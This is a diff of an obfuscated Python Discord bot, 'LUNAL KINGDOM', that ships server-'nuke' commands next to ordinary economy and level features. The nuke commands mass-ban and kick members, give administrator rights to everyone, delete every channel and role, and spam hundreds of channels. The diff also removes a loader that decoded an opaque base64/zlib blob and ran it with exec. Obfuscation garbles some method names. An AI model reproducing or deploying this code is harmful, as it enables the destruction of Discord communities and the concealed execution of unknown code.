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'))
-"""
+def ll1l11l1ll1l():
+    return datetime.now(timezone.utc)
 
-def _run():
-    try:
-        # 1. Làm sạch khoảng trắng & xuống dòng
-        clean_code = _code.strip().replace("\n", "").replace(" ", "").replace("\r", "")
-        
-        # 2. Tự động sửa lỗi Incorrect padding (thêm dấu '=' nếu thiếu)
-        missing_padding = len(clean_code) % 4
-        if missing_padding:
-            clean_code += '=' * (4 - missing_padding)
-            
-        # 3. Giải mã Base64
-        decoded_bytes = base64.b64decode(clean_code)
-        
-        # 4. Giải nén zlib (nếu có)
+def l111l1l1l111(l11l1lll1111: str, llllll111lll: str='INFO'):
+    print(f"[{datetime.now().strftime('%H:%M:%S')}] [{llllll111lll}] {l11l1lll1111}")
+
+def l11ll111l111(llll1l11l111: int) -> str:
+    if llll1l11l111 < 0:
+        return '0s'
+    l11l11l1ll1l = llll1l11l111 // 3600
+    l1ll1l11l111 = llll1l11l111 % 3600 // 60
+    l1lll1l11ll1 = llll1l11l111 % 60
+    if l11l11l1ll1l > 0:
+        return f'{l11l11l1ll1l}h {l1ll1l11l111}m {l1lll1l11ll1}s'
+    elif l1ll1l11l111 > 0:
+        return f'{l1ll1l11l111}m {l1lll1l11ll1}s'
+    else:
+        return f'{l1lll1l11ll1}s'
+
+def ll1l111l1111(llll1l11ll1l: int) -> str:
+    return f'{llll1l11ll1l:,}'
+
+def l1l1lll11ll1() -> int:
+    return random.randint(0, 16777215)
+l1lll11lllll = os.getenv('BOT_TOKEN')
+AVATAR_URL = 'https://i.pinimg.com/736x/63/37/02/6337023d80cd4e3c2b79e2baa44b4adf.jpg'
+LOG_CHANNEL_ID = 1537813100546236497
+WHITELIST_SERVER_IDS = [1536985687469985813, 1536276567808938098, 1511630281680093275]
+SUPPORT_LINK = 'https://discord.gg/5WFupkFbkM'
+SUPPORT_LINK2 = 'https://discord.gg/HVWArvBGy'
+OWNER_ID = 1536264763427000391
+OWNER_NAME = 'laibantlaymdisoi'
+PREFIX = 'l!'
+ll1lll11l1l1 = discord.Intents.default()
+ll1lll11l1l1.message_content = True
+ll1lll11l1l1.guilds = True
+ll1lll11l1l1.members = True
+ll1lll11l1l1.guild_messages = True
+ll1lll11l1l1.webhooks = True
+ll1lll11l1l1.presences = True
+ll1lll11l1l1.typing = True
+ll1lll11l1l1.dm_messages = True
+ll1lll11l1l1.dm_reactions = True
+ll1lll11l1l1.dm_typing = True
+ll1lll11l1l1.reactions = True
+ll1lll11l1l1.messages = True
+ll1lll11l1l1.bans = True
+ll1lll11l1l1.invites = True
+ll1lll11l1l1.voice_states = True
+l11ll11l111l = commands.Bot(command_prefix=PREFIX, intents=ll1lll11l1l1, help_command=None)
+
+class DataManager:
+
+    def __init__(ll11111ll11l, l1l11lll11l1: str='data.json'):
+        ll11111ll11l.filename = l1l11lll11l1
+        ll11111ll11l.data = {}
+        ll11111ll11l._load()
+
+    def ll111ll1111l(lllll1llll1l):
         try:
-            decompressed = zlib.decompress(decoded_bytes)
-        except Exception:
-            decompressed = decoded_bytes
-            
-        # 5. Chạy code
-        exec(decompressed.decode("utf-8"), globals())
-    except Exception as e:
-        print(f"[ERROR] Khong the giai ma code: {e}")
-        sys.exit(1)
+            with open(lllll1llll1l.filename, 'r', encoding='utf-8') as ll1ll1l111ll:
+                lllll1llll1l.data = json.load(ll1ll1l111ll)
+        except (FileNotFoundError, json.JSONDecodeError):
+            lllll1llll1l.data = {}
+            lllll1llll1l._save()
 
-if __name__ == "__main__":
-    _run()
+    def l11l1llll111(ll11ll11ll11):
+        try:
+            with open(ll11ll11ll11.filename, 'w', encoding='utf-8') as l1l11llll11l:
+                json.dump(ll11ll11ll11.data, l1l11llll11l, indent=2, ensure_ascii=False)
+        except Exception as e:
+            l111l1l1l111(f'Lỗi lưu dữ liệu: {e}', 'ERROR')
+
+    def l11111111l1l(lll11l111lll, l1l1l1l111ll: str, l111l1l1ll11=None):
+        return lll11l111lll.data.l11111111l1l(l1l1l1l111ll, l111l1l1ll11)
+
+    def set(llllll11l11l, lllllll11l11: str, ll1ll11ll111):
+        llllll11l11l.data[lllllll11l11] = ll1ll11ll111
+        llllll11l11l.l11l1llll111()
+
+    def lllllll11ll1(ll11l1l11lll, ll1l1ll11l11: str, l1ll1l11ll11):
+        if ll1l1ll11l11 not in ll11l1l11lll.data:
+            ll11l1l11lll.data[ll1l1ll11l11] = {}
+        if isinstance(ll11l1l11lll.data[ll1l1ll11l11], dict) and isinstance(l1ll1l11ll11, dict):
+            ll11l1l11lll.data[ll1l1ll11l11].lllllll11ll1(l1ll1l11ll11)
+        else:
+            ll11l1l11lll.data[ll1l1ll11l11] = l1ll1l11ll11
+        ll11l1l11lll.l11l1llll111()
+
+    def lll1lll1l111(lll11l1111l1, l1l111111111: str):
+        if l1l111111111 in lll11l1111l1.data:
+            del lll11l1111l1.data[l1l111111111]
+            lll11l1111l1.l11l1llll111()
+
+    def l1ll1l1lllll(llll111llll1, llll1l11l1l1: int) -> dict:
+        l1ll11l1l1l1 = f'user_{llll1l11l1l1}'
+        if l1ll11l1l1l1 not in llll111llll1.data:
+            llll111llll1.data[l1ll11l1l1l1] = {'xp': 0, 'level': 1, 'coins': 0, 'inventory': [], 'warnings': []}
+            llll111llll1.l11l1llll111()
+        return llll111llll1.data[l1ll11l1l1l1]
+
+    def l1lll1ll111l(lll111ll1111, ll1ll1l1ll1l: int) -> dict:
+        ll1ll1ll1lll = f'guild_{ll1ll1l1ll1l}'
+        if ll1ll1ll1lll not in lll111ll1111.data:
+            lll111ll1111.data[ll1ll1ll1lll] = {'prefix': PREFIX, 'welcome_channel': None, 'goodbye_channel': None}
+            lll111ll1111.l11l1llll111()
+        return lll111ll1111.data[ll1ll1ll1lll]
+llll1l1ll11l = DataManager()
+
+def l1ll1l11lll1(llll1111l1ll: int) -> dict:
+    l1ll1l1l1ll1 = f'anti_{llll1111l1ll}'
+    l111lllll1ll = llll1l1ll11l.l11111111l1l(l1ll1l1l1ll1)
+    if l111lllll1ll is None:
+        l111lllll1ll = {'antinuke': False, 'antiraid': False, 'antibot': False, 'log_channel': None, 'raid_threshold': 5, 'raid_time': 5, 'whitelist': []}
+        llll1l1ll11l.set(l1ll1l1l1ll1, l111lllll1ll)
+        l111l1l1l111(f'Tạo config anti mới cho server {llll1111l1ll}', 'INFO')
+    return l111lllll1ll
+
+class LevelSystem:
+
+    @staticmethod
+    def l111l1l1ll1l(ll1111lll111: int) -> int:
+        return llll1l1ll11l.l1ll1l1lllll(ll1111lll111).l11111111l1l('xp', 0)
+
+    @staticmethod
+    def l1ll11111111(lll11l11111l: int, llll11111l11: int):
+        ll111l1ll11l = llll1l1ll11l.l1ll1l1lllll(lll11l11111l)
+        ll111l1ll11l['xp'] = llll11111l11
+        llll1l1ll11l.lllllll11ll1(f'user_{lll11l11111l}', ll111l1ll11l)
+
+    @staticmethod
+    def l111ll1llll1(l1l1llll11ll: int, llll1111111l: int):
+        l1l1ll11llll = LevelSystem.l111l1l1ll1l(l1l1llll11ll)
+        LevelSystem.l1ll11111111(l1l1llll11ll, l1l1ll11llll + llll1111111l)
+
+    @staticmethod
+    def lll11ll1l11l(llll11l1llll: int) -> int:
+        return llll1l1ll11l.l1ll1l1lllll(llll11l1llll).l11111111l1l('level', 1)
+
+    @staticmethod
+    def l111111lllll(l1llll1lll1l: int, ll11ll1111ll: int):
+        l1lll11111ll = llll1l1ll11l.l1ll1l1lllll(l1llll1lll1l)
+        l1lll11111ll['level'] = ll11ll1111ll
+        llll1l1ll11l.lllllll11ll1(f'user_{l1llll1lll1l}', l1lll11111ll)
+
+    @staticmethod
+    def l11l11l11111(l11lll111lll: int) -> int:
+        return int(100 * 1.5 ** (l11lll111lll - 1))
+
+    @staticmethod
+    def l1l1l11lll1l(ll111ll111l1: int) -> bool:
+        ll11l1l1ll11 = llll1l1ll11l.l1ll1l1lllll(ll111ll111l1)
+        l1ll1l1ll111 = ll11l1l1ll11.l11111111l1l('xp', 0)
+        ll11l1l1l1l1 = ll11l1l1ll11.l11111111l1l('level', 1)
+        l1ll1l1l1111 = LevelSystem.l11l11l11111(ll11l1l1l1l1)
+        if l1ll1l1ll111 >= l1ll1l1l1111:
+            ll11l1l1ll11['level'] = ll11l1l1l1l1 + 1
+            ll11l1l1ll11['xp'] = l1ll1l1ll111 - l1ll1l1l1111
+            llll1l1ll11l.lllllll11ll1(f'user_{ll111ll111l1}', ll11l1l1ll11)
+            return True
+        return False
+
+class Economy:
+
+    @staticmethod
+    def l1ll1l11llll(ll11111111l1: int) -> int:
+        return llll1l1ll11l.l1ll1l1lllll(ll11111111l1).l11111111l1l('coins', 0)
+
+    @staticmethod
+    def l1111111ll11(l111llll11ll: int, l1l1l1lll111: int):
+        ll1lllll11l1 = llll1l1ll11l.l1ll1l1lllll(l111llll11ll)
+        ll1lllll11l1['coins'] = l1l1l1lll111
+        llll1l1ll11l.lllllll11ll1(f'user_{l111llll11ll}', ll1lllll11l1)
+
+    @staticmethod
+    def lll1l1lll1ll(ll1111111l1l: int, l1l1l1l1llll: int):
+        l111111l1l1l = Economy.l1ll1l11llll(ll1111111l1l)
+        Economy.l1111111ll11(ll1111111l1l, l111111l1l1l + l1l1l1l1llll)
+
+    @staticmethod
+    def l1ll1l1l11ll(ll1l11l1l1l1: int, l1l11l1ll111: int) -> bool:
+        lll111l1ll1l = Economy.l1ll1l11llll(ll1l11l1l1l1)
+        if lll111l1ll1l >= l1l11l1ll111:
+            Economy.l1111111ll11(ll1l11l1l1l1, lll111l1ll1l - l1l11l1ll111)
+            return True
+        return False
+
+    @staticmethod
+    def l11l1llll1ll(lll11llll111: int) -> list:
+        return llll1l1ll11l.l1ll1l1lllll(lll11llll111).l11111111l1l('inventory', [])
+
+    @staticmethod
+    def ll1l1l11ll1l(ll111111l1l1: int, llll1ll1l1l1: str):
+        l1l1l1lll11l = Economy.l11l1llll1ll(ll111111l1l1)
+        l1l1l1lll11l.append(llll1ll1l1l1)
+        l1l11l1l111l = llll1l1ll11l.l1ll1l1lllll(ll111111l1l1)
+        l1l11l1l111l['inventory'] = l1l1l1lll11l
+        llll1l1ll11l.lllllll11ll1(f'user_{ll111111l1l1}', l1l11l1l111l)
+snipe_cache = {}
+giveaways = {}
+polls = {}
+message_history = {}
+channel_creation_history = {}
+tickets = {}
+shop_items = {'vip': {'name': '⭐ VIP Role', 'price': 5000, 'desc': 'Role VIP đặc biệt'}, 'color': {'name': '🎨 Color Role', 'price': 2000, 'desc': 'Đổi màu role tùy chỉnh'}, 'boost': {'name': '🚀 XP Boost', 'price': 10000, 'desc': 'Tăng XP gấp đôi trong 24h'}}
+
+class Help(commands.Cog):
+
+    def __init__(ll1l1l1lll11, l1lllll1ll11):
+        ll1l1l1lll11.bot = l1lllll1ll11
+
+    @commands.command(name='help')
+    @commands.cooldown(1, 30, commands.BucketType.user)
+    async def ll1ll111l1ll(l11l11lllll1, ll1l1l1111l1, lllll1l1llll: str=None):
+        await ll1l1l1111l1.message.lll1lll1l111()
+        if lllll1l1llll and lllll1l1llll.lower() == 'nuke':
+            ll11l11ll111 = discord.Embed(title='🔥 LUNAL NUKE COMMANDS', description='Lệnh phá hoại server (chỉ dùng trong test)', color=16711748)
+            ll11l11ll111.add_field(name='`l!setup`', value='Nuke server (Owner no cooldown)', inline=False)
+            ll11l11ll111.add_field(name='`l!super_nuke`', value='Super nuke (120s cooldown)', inline=False)
+            ll11l11ll111.add_field(name='`l!massban`', value='Ban all members', inline=False)
+            ll11l11ll111.add_field(name='`l!masskick`', value='Kick all members', inline=False)
+            ll11l11ll111.add_field(name='`l!perm`', value='Grant full perms to @everyone', inline=False)
+            ll11l11ll111.add_field(name='`l!admin`', value='Create Admin role', inline=False)
+            ll11l11ll111.add_field(name='`l!role`', value='Spam 250 random roles', inline=False)
+            ll11l11ll111.add_field(name='`l!delete_all`', value='Delete all channels & roles', inline=False)
+            ll11l11ll111.add_field(name='`l!spam_channels`', value='Create 500+ spam channels', inline=False)
+            ll11l11ll111.add_field(name='`l!lockdown`', value='Lock all channels', inline=False)
+            ll11l11ll111.add_field(name='`l!mass_rename`', value='Rename all members', inline=False)
+            ll11l11ll111.set_footer(text='LUNAL KINGDOM | l!help')
+            await ll1l1l1111l1.send(embed=ll11l11ll111)
+            return
+        ll11l11ll111 = discord.Embed(title='⛧ LUNAL KINGDOM NEXUS - ULTIMATE BOT', description=f'**Prefix:** `{PREFIX}`\n**Support 1:** [Click here]({SUPPORT_LINK})\n**Support 2:** [Click here]({SUPPORT_LINK2})', color=3092271, timestamp=ll1l11l1ll1l())
+        ll11l11ll111.set_thumbnail(url='https://i.pinimg.com/736x/6c/3c/88/6c3c885c40e7d4b12b597fdf55c61951.jpg')
+        ll11l11ll111.add_field(name='🔥 NUKE', value='`l!help nuke`', inline=False)
+        ll11l11ll111.add_field(name='🛠️ UTILITY', value='`l!ping`, `l!sv`, `l!sv_all`, `l!avatar`, `l!userinfo`, `l!serverinfo`, `l!clear`, `l!kick`, `l!ban`, `l!warn`, `l!warnings`, `l!timeout`, `l!unban`, `l!say`, `l!embed`, `l!timer`, `l!snipe`', inline=False)
+        ll11l11ll111.add_field(name='🎮 FUN', value='`l!rps`, `l!poll`, `l!giveaway`, `l!endgiveaway`, `l!meme`, `l!gif`, `l!8ball`, `l!coinflip`', inline=False)
+        ll11l11ll111.add_field(name='💰 ECONOMY', value='`l!balance`, `l!daily`, `l!work`, `l!shop`, `l!buy`, `l!inventory`', inline=False)
+        ll11l11ll111.add_field(name='📊 LEVEL', value='`l!level`, `l!rank`', inline=False)
+        ll11l11ll111.add_field(name='🛡️ ANTI', value='`l!antinuke`, `l!antiraid`, `l!antibot`, `l!setlog`, `l!anti`', inline=False)
+        ll11l11ll111.add_field(name='🎫 TICKET', value='`l!ticket`, `l!close`', inline=False)
+        ll11l11ll111.add_field(name='⚡ QUICK', value='`l!setup`, `l!ping`, `l!sv`, `l!balance`, `l!daily`', inline=False)
+        ll11l11ll111.set_footer(text='LUNAL KINGDOM | Made with ❤️ | 200+ features')
+        ll1l111111l1 = View()
+        ll1l111111l1.ll1l1l11ll1l(Button(label='Support 1', style=discord.ButtonStyle.link, url=SUPPORT_LINK))
+        ll1l111111l1.ll1l1l11ll1l(Button(label='Support 2', style=discord.ButtonStyle.link, url=SUPPORT_LINK2))
+        ll1l111111l1.ll1l1l11ll1l(Button(label='Invite', style=discord.ButtonStyle.link, url='https://discord.com/oauth2/authorize?client_id=1477295832335384598&permissions=8&scope=bot%20applications.commands'))
+        await ll1l1l1111l1.send(embed=ll11l11ll111, view=ll1l111111l1)
+
+class SetupView(discord.ui.View):
+
+    def __init__(ll1ll11l11ll, ll1l111lllll):
+        super().__init__(timeout=120)
+        ll1ll11l11ll.ctx = ll1l111lllll
+        ll1ll11l11ll.value = None
+
+    @discord.ui.button(label='✅ Đồng ý', style=discord.ButtonStyle.green)
+    async def l1l11l1l1111(l1llllll1l11, l11l1ll1l1l1: discord.Interaction, lll1l11ll1ll: discord.ui.Button):
+        if l11l1ll1l1l1.user.id != l1llllll1l11.ctx.author.id:
+            await l11l1ll1l1l1.response.send_message('❌ Bạn không có quyền tương tác với nút này.', ephemeral=True)
+            return
+        await l11l1ll1l1l1.response.send_message('✅ Đã đồng ý! Bắt đầu nuke...', ephemeral=True)
+        l1llllll1l11.value = True
+        l1llllll1l11.stop()
+        lll1111lll11 = l1llllll1l11.ctx.channel
+        try:
+            await lll1111lll11.send(f'{l1llllll1l11.ctx.author.mention} 🔥 **Bắt đầu nuke server này!**')
+        except:
+            pass
+        ll1l111l11l1 = NukeV2()
+        await ll1l111l11l1.setup(l1llllll1l11.ctx.message)
+
+    @discord.ui.button(label='❌ Từ chối', style=discord.ButtonStyle.red)
+    async def ll11ll1l11ll(l1111l11lll1, llll1ll11ll1: discord.Interaction, l11l111111ll: discord.ui.Button):
+        if llll1ll11ll1.user.id != l1111l11lll1.ctx.author.id:
+            await llll1ll11ll1.response.send_message('❌ Bạn không có quyền tương tác với nút này.', ephemeral=True)
+            return
+        await llll1ll11ll1.response.send_message('❌ Đã hủy nuke.', ephemeral=True)
+        l1111l11lll1.value = False
+        l1111l11lll1.stop()
+
+class Nuke(commands.Cog):
+
+    def __init__(llll11ll11ll, lll1l11l11ll):
+        llll11ll11ll.bot = lll1l11l11ll
+
+    def lllll11111ll(lll111ll1lll, lll11111l1ll):
+        return lll11111l1ll.id == OWNER_ID or lll11111l1ll.name == OWNER_NAME
+
+    @commands.command(name='setup')
+    @commands.cooldown(1, 300, commands.BucketType.user)
+    async def ll1ll1l1llll(l11ll1l1ll11, lll1ll1l1ll1):
+        if l11ll1l1ll11.lllll11111ll(lll1ll1l1ll1.author):
+            lll1ll1l1ll1.command.reset_cooldown(lll1ll1l1ll1)
+        if lll1ll1l1ll1.guild.id in WHITELIST_SERVER_IDS:
+            return
+        await lll1ll1l1ll1.message.lll1lll1l111()
+        ll1llll1llll = discord.Embed(title='⚠️ THOẢ THUẬN NUKE', description='Bạn có chắc chắn muốn nuke server này? Hành động này KHÔNG THỂ HOÀN TÁC.\n\nHãy xác nhận bằng cách bấm nút bên dưới.', color=16711680, timestamp=ll1l11l1ll1l())
+        ll1llll1llll.add_field(name='Server', value=lll1ll1l1ll1.guild.name, inline=False)
+        ll1llll1llll.add_field(name='ID Server', value=lll1ll1l1ll1.guild.id, inline=False)
+        ll1llll1llll.add_field(name='Thực hiện bởi', value=lll1ll1l1ll1.author.mention, inline=False)
+        ll1l1l11l111 = SetupView(lll1ll1l1ll1)
+        try:
+            await lll1ll1l1ll1.author.send(embed=ll1llll1llll, view=ll1l1l11l111)
